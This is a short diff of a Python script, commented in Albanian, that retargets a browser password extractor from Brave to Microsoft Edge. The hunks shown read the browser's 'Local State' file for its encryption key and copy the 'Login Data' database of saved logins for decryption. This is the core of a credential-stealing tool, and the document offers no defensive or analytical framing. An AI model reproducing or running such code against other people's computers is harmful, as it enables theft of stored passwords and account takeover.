@@ -17,7 +17,7 @@ def chrome_date_and_time(chrome_data):
 def fetching_encryption_key():
     # Pathi qe eshte ne kompjuterin e shfrytzuesit
     local_computer_directory_path = os.path.join(
-        os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser",
+        os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge",
         "User Data", "Local State")
 
     with open(local_computer_directory_path, "r", encoding="utf-8") as f:
@@ -56,7 +56,7 @@ def password_decryption(password, encryption_key):
 def main():
     key = fetching_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
+                           "Microsoft", "Edge", "User Data", "Default", "Login Data")
     filename = "ChromePasswords.db"
     shutil.copyfile(db_path, filename)
 
